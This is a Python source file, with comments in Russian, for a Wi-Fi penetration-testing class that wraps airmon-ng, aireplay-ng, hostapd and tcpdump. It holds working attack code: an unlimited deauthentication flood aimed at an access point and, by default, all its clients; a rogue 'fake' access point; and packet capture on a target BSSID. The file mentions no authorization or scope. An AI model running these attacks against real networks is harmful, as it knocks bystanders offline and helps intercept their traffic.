import subprocess
import re
import json
from typing import List, Dict
import asyncio
from scapy.all import *
from datetime import datetime

class WiFiPentest:
    def __init__(self):
        self.interface = "wlan0"
        self.monitor_interface = "wlan0mon"
        self.captured_handshakes = []
        self.active_attacks = {}
        
    async def start_monitor_mode(self) -> Dict:
        """Включение режима мониторинга"""
        try:
            # Убиваем процессы, которые могут мешать
            subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
            # Включаем режим мониторинга
            subprocess.run(["airmon-ng", "start", self.interface], capture_output=True)
            return {"status": "success", "message": "Monitor mode enabled"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def stop_monitor_mode(self) -> Dict:
        """Выключение режима мониторинга"""
        try:
            subprocess.run(["airmon-ng", "stop", self.monitor_interface], capture_output=True)
            subprocess.run(["service", "NetworkManager", "start"], capture_output=True)
            return {"status": "success", "message": "Monitor mode disabled"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def scan_networks(self) -> List[Dict]:
        """Сканирование WiFi сетей с дополнительной информацией"""
        try:
            result = subprocess.run(["iwlist", self.interface, "scanning"], capture_output=True, text=True)
            networks = []
            current_network = {}
            
            for line in result.stdout.split('\n'):
                if 'Cell' in line:
                    if current_network:
                        networks.append(current_network)
                    current_network = {}
                elif 'ESSID' in line:
                    current_network['ssid'] = line.split('"')[1]
                elif 'Channel' in line:
                    current_network['channel'] = line.split(':')[1].strip()
                elif 'Encryption' in line:
                    current_network['encryption'] = line.split(':')[1].strip()
                elif 'Quality' in line:
                    current_network['signal'] = line.split('=')[1].split(' ')[0]
                elif 'Address' in line:
                    current_network['bssid'] = line.split('Address: ')[1].strip()
            
            if current_network:
                networks.append(current_network)
            
            return networks
        except Exception as e:
            return [{"error": str(e)}]

    async def start_deauth_attack(self, bssid: str, client_mac: str = "FF:FF:FF:FF:FF:FF") -> Dict:
        """Запуск деаутентификации клиента"""
        try:
            # Создаем уникальный ID для атаки
            attack_id = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Запускаем процесс деаутентификации в фоне
            process = subprocess.Popen([
                "aireplay-ng",
                "--deauth", "0",  # Бесконечное количество пакетов
                "-a", bssid,      # MAC точки доступа
                "-c", client_mac, # MAC клиента
                self.monitor_interface
            ])
            
            self.active_attacks[attack_id] = {
                "process": process,
                "type": "deauth",
                "bssid": bssid,
                "client": client_mac,
                "start_time": datetime.now()
            }
            
            return {
                "status": "success",
                "attack_id": attack_id,
                "message": "Deauth attack started"
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def stop_attack(self, attack_id: str) -> Dict:
        """Остановка активной атаки"""
        try:
            if attack_id in self.active_attacks:
                attack = self.active_attacks[attack_id]
                attack["process"].terminate()
                del self.active_attacks[attack_id]
                return {"status": "success", "message": "Attack stopped"}
            return {"status": "error", "message": "Attack not found"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def create_fake_ap(self, ssid: str, channel: int = 1) -> Dict:
        """Создание фейковой точки доступа"""
        try:
            # Создаем конфиг для hostapd
            config = f"""
interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
            with open("/tmp/hostapd.conf", "w") as f:
                f.write(config)

            # Запускаем hostapd
            process = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"])
            
            attack_id = f"fake_ap_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            self.active_attacks[attack_id] = {
                "process": process,
                "type": "fake_ap",
                "ssid": ssid,
                "channel": channel,
                "start_time": datetime.now()
            }
            
            return {
                "status": "success",
                "attack_id": attack_id,
                "message": "Fake AP created"
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def start_packet_capture(self, bssid: str = None) -> Dict:
        """Запуск захвата пакетов"""
        try:
            filename = f"/tmp/capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
            
            if bssid:
                process = subprocess.Popen([
                    "tcpdump",
                    "-i", self.monitor_interface,
                    "-w", filename,
                    f"ether host {bssid}"
                ])
            else:
                process = subprocess.Popen([
                    "tcpdump",
                    "-i", self.monitor_interface,
                    "-w", filename
                ])
            
            attack_id = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            self.active_attacks[attack_id] = {
                "process": process,
                "type": "capture",
                "filename": filename,
                "bssid": bssid,
                "start_time": datetime.now()
            }
            
            return {
                "status": "success",
                "attack_id": attack_id,
                "message": "Packet capture started"
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def get_active_attacks(self) -> List[Dict]:
        """Получение списка активных атак"""
        return [{
            "id": k,
            "type": v["type"],
            "start_time": v["start_time"].isoformat(),
            **{key: value for key, value in v.items() if key not in ["process", "start_time"]}
        } for k, v in self.active_attacks.items()] 